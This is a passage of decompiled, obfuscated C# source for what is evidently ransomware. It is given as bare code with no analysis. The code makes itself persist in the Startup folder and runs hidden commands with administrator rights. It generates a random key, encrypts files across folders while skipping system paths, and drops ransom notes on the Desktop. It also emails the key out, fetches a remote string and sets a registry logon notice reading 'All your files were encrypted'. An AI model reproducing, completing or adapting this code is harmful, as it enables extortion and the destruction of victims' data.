	public static string sCXdylZCmGtbMZAS;

	public static string YgticnAtLGAH;

	public static string OpcjItJxaNOzvLA;

	public static string fvrAhwLOOqtuz;

	public static string tjhvnNOOJsHK;

	public static string AFeeYbGHoUrNo;

	public static string iTDKzcQgCP;

	public static string vIamCfVWgLiDG;

	public static string GrnrcFIflPqwmrM;

	public static string GAwtbatpYNT;

	public static string GgDaSwnIUzDUy;

	public static string nqhEPzuQrEgIt;

	public static string GxlwmrhwmCMkXY;

	public static string aXJBcVQFkHM;

	public static string pZUvJseIiP;

	public static string MmTRHWEtabs;

	public static string gAPIhZLzhm;

	public static string PmRBdqDbAECqW;

	public static string JiSGWxscNj;

	public static string CTBPaCBmMFYPF;

	public static string QwacyyfizHRMTiM;

	public static string dxhwpdWQLYKeY;

	public static string sqCgiCiGDEu;

	public static string gxbTTorODqIIB;

	public static string heXRHbTkSEb;

	public static string HuvvdBBcIbJxH;

	public static string[] CxZEmnxTbhJSa;

	public static string pKXDvwefnl;

	public static bool dVQGFoqGywL;

	public static string vdRdKDxZaXks;

	public static bool nzkUSgBdGXcD;

	public static bool KNejVyyTLcuDoE;

	public static bool IWvOUVeuIJoSI;

	public static bool NjqbqDMbMU;

	public static string UQSYzQClpMD;

	public static bool XKASwlGUBpzh;

	public static bool yJUmNLUGjzkQI;

	public static bool EpSockQKpzBN;

	public static bool CZxXSwBijFtPD;

	public static bool fHmXdeOHBwOZw;

	public static string PKHbXGOhol;

	public static bool gSSiJyrGCBHZ;

	public static Stopwatch zlSPmNPBYDfJm;

	public static int xGavVPJiJhi;

	public static int puMlKkdeEF;

	public static bool VVuqpZMWeENUoLrM;

	public static string lZgHybZuOJvtb;

	public static string[] iOwxkCRdpwPff;

	public static List<string> RoSPusNTLSb;

	public static int XvWBphKuRyvD;

	public static List<string> txWDykcdpRIUT;

	public static List<string> lfvMbUBnXZDV;

	public static List<string> pikrEglCSYxu;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatec;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate1b;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			zctIaEqtkziMSx CS_0024_003C_003E8__locals0 = new zctIaEqtkziMSx();
			CS_0024_003C_003E8__locals0.BtegvjAXQpQr = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.BtegvjAXQpQr) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			JwUAofSsvPPmpfh.JpSZGBMNUNXns(AZaOxwJcnDFPb);
		}
		catch (Exception)
		{
		}
		try
		{
			if (sqCgiCiGDEu == getString_0(107396740))
			{
				Thread thread = new Thread(PBHjmQCLxGF.TNzWYhFWxBOo);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (AIzbAgaRmun == getString_0(107396740))
		{
			Thread.Sleep(int.Parse(dzjEboULGEXLt));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && dUlNsNRISof == getString_0(107396740))
		{
			try
			{
				jrWaBBirXR(BaxqkGxiBeqS(getString_0(107397215)));
			}
			catch
			{
			}
		}
		try
		{
			if (vgnbVPuEBBsBxef == getString_0(107396740) && doKOdzxffEfH.KKVKpOnIwWU())
			{
				new mXYOWVOrqAnZiu().kUlTMDSCgmEil(bool_0: false);
				doKOdzxffEfH.gvMfpFraLKBL();
			}
		}
		catch (Exception)
		{
		}
		if (JGPRtFKquVJgD == getString_0(107396740) && doKOdzxffEfH.KKVKpOnIwWU())
		{
			new mXYOWVOrqAnZiu().kUlTMDSCgmEil(bool_0: false);
			new mXYOWVOrqAnZiu().maZTILbGYPdjP();
		}
		if (aOlUzzLVcTqPTZ == getString_0(107396740))
		{
			CfdMASQXGRzZ.jVDEbxgTTPKBZD();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397110);
			string text2 = text + Path.GetFileName(fileName);
			if (UlCmUlRoTcchfe == getString_0(107396740) && fileName != text2)
			{
				Thread thread2 = new Thread(vQOmdzTQzq);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (wltjXNSnNn == getString_0(107396740) && mainModule != null && fileName != text2)
			{
				try
				{
					LCDRypxVRToeCM = RDsbBOhrCeUf(0, GDnIIBbHro.Count);
					File.Copy(fileName, text + GDnIIBbHro[LCDRypxVRToeCM], overwrite: true);
					Process.Start(text + GDnIIBbHro[LCDRypxVRToeCM]);
					itRibalZUGJhza();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (bMFiiPOhazs == getString_0(107396740) && DateTime.Now < qxVYSHbtKRdGgb)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (kPTEvsSxKFMV == getString_0(107396740) && DateTime.Now > zURDwkTFacZ)
			{
				itRibalZUGJhza();
			}
		}
		catch
		{
		}
		GNwqxUGaeE();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatec == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatec = delegate
			{
				List<string> fJNexnLlneosRhQ = FJNexnLlneosRhQ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						nOIZGFqjik(getString_0(107388437), string_0);
					};
				}
				Parallel.ForEach(fJNexnLlneosRhQ, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				List<string> source = ctnxoknClYAD;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						nOIZGFqjik(BaxqkGxiBeqS(getString_0(107388460)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				if (HuvvdBBcIbJxH == getString_0(107396740))
				{
					string[] cxZEmnxTbhJSa = CxZEmnxTbhJSa;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							nOIZGFqjik(BaxqkGxiBeqS(getString_0(107388460)), getString_0(107388403) + string_0 + getString_0(107388426));
						};
					}
					Parallel.ForEach(cxZEmnxTbhJSa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				if (!PxuvQHOJlLM().Contains(getString_0(107388137)))
				{
					zyaalHhzPWGp(AXvssecAngWd);
				}
				else
				{
					List<string> source2 = mKLyhqkijpZNwYs;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
						{
							nOIZGFqjik(BaxqkGxiBeqS(SqbUSPIscVoYxhFbFA(getString_0(107388421))), string_0);
						};
					}
					Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				}
				List<string> source3 = zcmRrFXWRTRDV;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						nOIZGFqjik(BaxqkGxiBeqS(getString_0(107388396)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				List<string> vnGdzxwiUTFhYj = VnGdzxwiUTFhYj;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
					{
						nOIZGFqjik(getString_0(107388347), string_0);
					};
				}
				Parallel.ForEach(vnGdzxwiUTFhYj, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatec);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		if (GAwtbatpYNT == getString_0(107397137))
		{
			ConiRwhLfPHH();
		}
		if (GAwtbatpYNT == getString_0(107396740))
		{
			try
			{
				gstRUQFlqobUGB();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && IWvOUVeuIJoSI)
			{
				try
				{
					Thread thread4 = new Thread(piQkBxQtDXQ.ZxJLdKwjkkx);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			nOIZGFqjik(getString_0(107397132), BaxqkGxiBeqS(getString_0(107397087)));
			nOIZGFqjik(getString_0(107397132), BaxqkGxiBeqS(getString_0(107397014)));
			nOIZGFqjik(BaxqkGxiBeqS(getString_0(107396445)), BaxqkGxiBeqS(getString_0(107396464)));
			nOIZGFqjik(BaxqkGxiBeqS(getString_0(107396445)), BaxqkGxiBeqS(getString_0(107396334)));
		}
		SecureString secureString = new SecureString();
		if (gzyCOUUaDblUjB == getString_0(107397137))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			xmYLyARLYEl = getString_0(107396672);
		}
		EANmnkdFJkrj = pIXIfQBxEjhZIRLa.bvSKDBbYtIq(xsxPtqnBjsRCH(secureString));
		if (tjhvnNOOJsHK == getString_0(107396740))
		{
			BuiWoIYCjKLOQXl();
		}
		if (EpSockQKpzBN)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), PKHbXGOhol)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), PKHbXGOhol), string.Concat(BaxqkGxiBeqS(getString_0(107396627)), new WebClient().DownloadString(BaxqkGxiBeqS(getString_0(107396602))), getString_0(107396593), BaxqkGxiBeqS(getString_0(107396588)), DateTime.Now, getString_0(107396593), BaxqkGxiBeqS(getString_0(107396547)), EANmnkdFJkrj));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), PKHbXGOhol), getString_0(107396490) + EANmnkdFJkrj);
				}
			}
			catch (Exception ex7)
			{
				if (XKASwlGUBpzh)
				{
					try
					{
						File.AppendAllText(UQSYzQClpMD, getString_0(107395949) + ex7.Message + getString_0(107396593));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		OwpmqtzfNfdC.sMoFygPjEEKrBpl(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), gAPIhZLzhm), LOHHDmNGQodDm(EANmnkdFJkrj), null, null, getString_0(107395868), getString_0(107395883), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			mhUKLqveIkl();
		}
		try
		{
			try
			{
				if (gSSiJyrGCBHZ)
				{
					Console.WriteLine(getString_0(107395834));
				}
			}
			catch
			{
			}
			cooiokXvhe(new string[1] { getString_0(107395817) }, new string[100]
			{
				getString_0(107395776),
				getString_0(107395771),
				getString_0(107395766),
				getString_0(107395789),
				getString_0(107395784),
				getString_0(107395779),
				getString_0(107395742),
				getString_0(107395737),
				getString_0(107395732),
				getString_0(107395759),
				getString_0(107395754),
				getString_0(107395749),
				getString_0(107395708),
				getString_0(107395703),
				getString_0(107395726),
				getString_0(107395721),
				getString_0(107395716),
				getString_0(107396191),
				getString_0(107396186),
				getString_0(107396181),
				getString_0(107396204),
				getString_0(107396199),
				getString_0(107396194),
				getString_0(107396157),
				getString_0(107396152),
				getString_0(107396147),
				getString_0(107396174),
				getString_0(107396169),
				getString_0(107396164),
				getString_0(107396127),
				getString_0(107396122),
				getString_0(107396117),
				getString_0(107396144),
				getString_0(107396139),
				getString_0(107396130),
				getString_0(107396093),
				getString_0(107396088),
				getString_0(107396083),
				getString_0(107395742),
				getString_0(107396110),
				getString_0(107395732),
				getString_0(107396101),
				getString_0(107396064),
				getString_0(107396059),
				getString_0(107396054),
				getString_0(107396081),
				getString_0(107396076),
				getString_0(107396071),
				getString_0(107396066),
				getString_0(107396029),
				getString_0(107396024),
				getString_0(107396019),
				getString_0(107396046),
				getString_0(107396041),
				getString_0(107396036),
				getString_0(107395999),
				getString_0(107395994),
				getString_0(107395989),
				getString_0(107396012),
				getString_0(107396007),
				getString_0(107395966),
				getString_0(107395985),
				getString_0(107396110),
				getString_0(107395972),
				getString_0(107395419),
				getString_0(107395410),
				getString_0(107395433),
				getString_0(107395392),
				getString_0(107395383),
				getString_0(107395378),
				getString_0(107395401),
				getString_0(107395360),
				getString_0(107395351),
				getString_0(107395346),
				getString_0(107395373),
				getString_0(107395368),
				getString_0(107395363),
				getString_0(107395326),
				getString_0(107395321),
				getString_0(107395344),
				getString_0(107395339),
				getString_0(107395334),
				getString_0(107395297),
				getString_0(107395292),
				getString_0(107395287),
				getString_0(107395310),
				getString_0(107395301),
				getString_0(107395264),
				getString_0(107396144),
				getString_0(107395259),
				getString_0(107395254),
				getString_0(107395281),
				getString_0(107395276),
				getString_0(107395271),
				getString_0(107395230),
				getString_0(107395225),
				getString_0(107395220),
				getString_0(107395243),
				getString_0(107395238),
				getString_0(107395201)
			}, new string[0], xsxPtqnBjsRCH(secureString), getString_0(107395196));
		}
		catch (Exception ex9)
		{
			if (XKASwlGUBpzh)
			{
				try
				{
					File.AppendAllText(UQSYzQClpMD, getString_0(107395691) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395634)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395634));
				streamWriter.WriteLine(BaxqkGxiBeqS(getString_0(107395633)));
				streamWriter.WriteLine(getString_0(107396593));
				streamWriter.WriteLine(BaxqkGxiBeqS(getString_0(107393615)));
				streamWriter.WriteLine(EANmnkdFJkrj);
				if (VRPOZozIAQYe == getString_0(107397137))
				{
					streamWriter.WriteLine(getString_0(107396593));
					streamWriter.WriteLine(BaxqkGxiBeqS(getString_0(107393582)) + Convert.ToString(diKnMADbMAYp.Count));
				}
				if (VVuqpZMWeENUoLrM)
				{
					streamWriter.WriteLine(getString_0(107396593));
					streamWriter.WriteLine(BaxqkGxiBeqS(getString_0(107393473)));
					streamWriter.WriteLine(jCOJRzSaQahQUJH.FdEYtmTMffelS());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395634));
				if (!text3.Contains(EANmnkdFJkrj) && !nzkUSgBdGXcD)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395634), getString_0(107393440) + EANmnkdFJkrj);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in BTRlqjNfLlWsE)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395634)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395634), item + getString_0(107395634), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395634));
					if (!text4.Contains(EANmnkdFJkrj) && !nzkUSgBdGXcD)
					{
						File.AppendAllText(item + getString_0(107395634), getString_0(107393440) + EANmnkdFJkrj);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!NjqbqDMbMU && num > 10)
			{
				break;
			}
		}
		if (CTBPaCBmMFYPF == getString_0(107396740))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393443)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393443));
					streamWriter2.WriteLine(BaxqkGxiBeqS(getString_0(107393410)));
					streamWriter2.WriteLine(getString_0(107396593));
					streamWriter2.WriteLine(BaxqkGxiBeqS(getString_0(107392881)));
					streamWriter2.WriteLine(EANmnkdFJkrj + BaxqkGxiBeqS(getString_0(107392760)));
					if (VRPOZozIAQYe == getString_0(107397137))
					{
						streamWriter2.WriteLine(getString_0(107396593));
						streamWriter2.WriteLine(BaxqkGxiBeqS(getString_0(107392779)) + BaxqkGxiBeqS(getString_0(107393582)) + Convert.ToString(diKnMADbMAYp.Count) + BaxqkGxiBeqS(getString_0(107392760)));
					}
					if (VVuqpZMWeENUoLrM)
					{
						streamWriter2.WriteLine(getString_0(107396593));
						streamWriter2.WriteLine(BaxqkGxiBeqS(getString_0(107393473)));
						streamWriter2.WriteLine(jCOJRzSaQahQUJH.FdEYtmTMffelS());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395634));
					if (!text5.Contains(EANmnkdFJkrj) && !nzkUSgBdGXcD)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393443), BaxqkGxiBeqS(getString_0(107392779)) + getString_0(107393440) + EANmnkdFJkrj + BaxqkGxiBeqS(getString_0(107392760)));
					}
				}
			}
			catch
			{
			}
		}
		if (XyPIFbjkPYE == getString_0(107396740))
		{
			try
			{
				if (VRPOZozIAQYe == getString_0(107397137))
				{
					jCOJRzSaQahQUJH.YuYvdHAEpxhBUz(getString_0(107392718), getString_0(107392713), getString_0(107392668), string.Concat(BaxqkGxiBeqS(getString_0(107396627)), new WebClient().DownloadString(BaxqkGxiBeqS(getString_0(107396602))), getString_0(107392659), BaxqkGxiBeqS(getString_0(107396588)), DateTime.Now, getString_0(107396593), BaxqkGxiBeqS(getString_0(107392686)), Convert.ToString(diKnMADbMAYp.Count), getString_0(107396593), BaxqkGxiBeqS(getString_0(107396547)), EANmnkdFJkrj));
				}
				else
				{
					jCOJRzSaQahQUJH.YuYvdHAEpxhBUz(getString_0(107392718), getString_0(107392713), getString_0(107392668), string.Concat(BaxqkGxiBeqS(getString_0(107396627)), new WebClient().DownloadString(BaxqkGxiBeqS(getString_0(107396602))), getString_0(107392659), BaxqkGxiBeqS(getString_0(107396588)), DateTime.Now, getString_0(107396593), BaxqkGxiBeqS(getString_0(107392686)), Convert.ToString(diKnMADbMAYp.Count), getString_0(107396593), BaxqkGxiBeqS(getString_0(107396547)), EANmnkdFJkrj));
				}
			}
			catch
			{
			}
		}
		if (qjFKpsqJnCjq == getString_0(107396740))
		{
			try
			{
				osGUNyEmFcPsw.EwbANDovccUF(new Uri(getString_0(107393117)));
			}
			catch
			{
			}
		}
		if (CTBPaCBmMFYPF == getString_0(107397137))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395634)))
				{
					Process.Start(BaxqkGxiBeqS(getString_0(107393116)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395634));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393443)))
				{
					Process.Start(BaxqkGxiBeqS(getString_0(107393123)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393443));
				}
			}
			catch
			{
			}
		}
		if (tjhvnNOOJsHK == getString_0(107396740))
		{
			if (AFeeYbGHoUrNo == getString_0(107396740) && !string.IsNullOrEmpty(iTDKzcQgCP) && !string.IsNullOrEmpty(vIamCfVWgLiDG))
			{
				VGEBiJRmUASQ(iTDKzcQgCP, vIamCfVWgLiDG);
			}
			else
			{
				VGEBiJRmUASQ(getString_0(107393074), getString_0(107393045));
			}
		}
		if (aXJBcVQFkHM != getString_0(107392331))
		{
			vbVjidfpteXm(aXJBcVQFkHM);
		}
		if (!string.IsNullOrEmpty(OpcjItJxaNOzvLA))
		{
			try
			{
				File.Delete(OpcjItJxaNOzvLA);
			}
			catch
			{
			}
		}
		if (XKASwlGUBpzh)
		{
			try
			{
				File.AppendAllText(UQSYzQClpMD, getString_0(107392282));
			}
			catch (Exception)
			{
			}
		}
		if (xGwyIHSaEbgRgwng == getString_0(107392301))
		{
			itRibalZUGJhza();
		}
	}

	public static void vQOmdzTQzq()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(BaxqkGxiBeqS(getString_0(107392292)), BaxqkGxiBeqS(getString_0(107392138)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int RDsbBOhrCeUf(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> fFKAoywEsvGmAlN(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107392601)) && !text.Contains(getString_0(107392576)) && !text.Contains(getString_0(107392543)) && !text.ToLower().Contains(getString_0(107392558)) && !text.ToLower().Contains(getString_0(107392513)) && !text.Contains(getString_0(107392520)) && !text.Contains(getString_0(107392467)) && !text.ToLower().Contains(getString_0(107392482)) && !text.ToLower().Contains(getString_0(107392437)) && !text.ToLower().Contains(getString_0(107392432)) && !text.ToLower().Contains(getString_0(107392423)) && !text.ToLower().Contains(getString_0(107392374)) && !text.ToLower().Contains(getString_0(107392393)) && !text.ToLower().Contains(getString_0(107391836)) && !text.ToLower().Contains(getString_0(107391847)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107391822)) && !fileInfo.FullName.Contains(getString_0(107391773)) && !fileInfo.FullName.Contains(getString_0(107391788)) && !fileInfo.FullName.Contains(getString_0(107391739)) && !fileInfo.FullName.Contains(getString_0(107391754)) && !fileInfo.FullName.Contains(getString_0(107391705)) && !fileInfo.FullName.Contains(getString_0(107391720)) && !fileInfo.FullName.Contains(getString_0(107391671)) && !fileInfo.FullName.Contains(getString_0(107391690)) && !fileInfo.FullName.Contains(getString_0(107391637)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391656)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391611)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391626)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392089)) && !fileInfo.FullName.Contains(BaxqkGxiBeqS(getString_0(107392104))) && !fileInfo.FullName.Contains(getString_0(107392079)) && !fileInfo.FullName.Contains(getString_0(107392066)) && !fileInfo.FullName.Contains(getString_0(107392049)) && !fileInfo.FullName.EndsWith(getString_0(107395196)) && !fileInfo.FullName.EndsWith(getString_0(107391992)) && !fileInfo.FullName.EndsWith(getString_0(107391987)) && !fileInfo.FullName.EndsWith(getString_0(107392014)) && !fileInfo.FullName.EndsWith(getString_0(107392009)) && !fileInfo.FullName.Contains(getString_0(107392004)) && !fileInfo.FullName.Contains(gAPIhZLzhm) && !fileInfo.FullName.Contains(UQSYzQClpMD) && !fileInfo.FullName.Contains(PKHbXGOhol))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(UyWlViVLMSGFTM) * 1024.0 * 1024.0 && WpurxQrnnk == getString_0(107396740))
						{
							list.Add(fileInfo.FullName);
							duXkyMVzMXQIVc(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && WpurxQrnnk == getString_0(107397137))
						{
							list.Add(fileInfo.FullName);
							duXkyMVzMXQIVc(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void ConiRwhLfPHH()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107391955));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!QuXRcyqyIgSTxy.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391902), getString_0(107397110)).Replace(getString_0(107391897), getString_0(107391902))
					.Replace(getString_0(107391920), getString_0(107393117))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					QuXRcyqyIgSTxy.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391902), getString_0(107397110)).Replace(getString_0(107391897), getString_0(107391902))
						.Replace(getString_0(107391920), getString_0(107393117))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107391915), getString_0(107393117)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string nOIZGFqjik(string ecFupgTeJfZg = "", string dzInteTCLHDU = "")
	{
		string result = getString_0(107393117);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = ecFupgTeJfZg,
				Arguments = dzInteTCLHDU,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void jrWaBBirXR(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107391906),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string SqbUSPIscVoYxhFbFA(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string BaxqkGxiBeqS(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void xMFeNwpcrJK(string mudSPVTXbHcgx = "", string efqTRDgRTSo = "SW5mb3JtYXRpb24uLi4=", string lwDeYskYHjiWIpvd = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		mudSPVTXbHcgx = SqbUSPIscVoYxhFbFA(getString_0(107391889));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BaxqkGxiBeqS(mudSPVTXbHcgx), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(BaxqkGxiBeqS(getString_0(107391280)), BaxqkGxiBeqS(efqTRDgRTSo));
				registryKey.SetValue(BaxqkGxiBeqS(getString_0(107391247)), BaxqkGxiBeqS(lwDeYskYHjiWIpvd));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			mudSPVTXbHcgx = SqbUSPIscVoYxhFbFA(getString_0(107391186));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BaxqkGxiBeqS(mudSPVTXbHcgx), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(BaxqkGxiBeqS(getString_0(107391113)), BaxqkGxiBeqS(efqTRDgRTSo));
				registryKey.SetValue(BaxqkGxiBeqS(getString_0(107391592)), BaxqkGxiBeqS(lwDeYskYHjiWIpvd));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void BuiWoIYCjKLOQXl()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
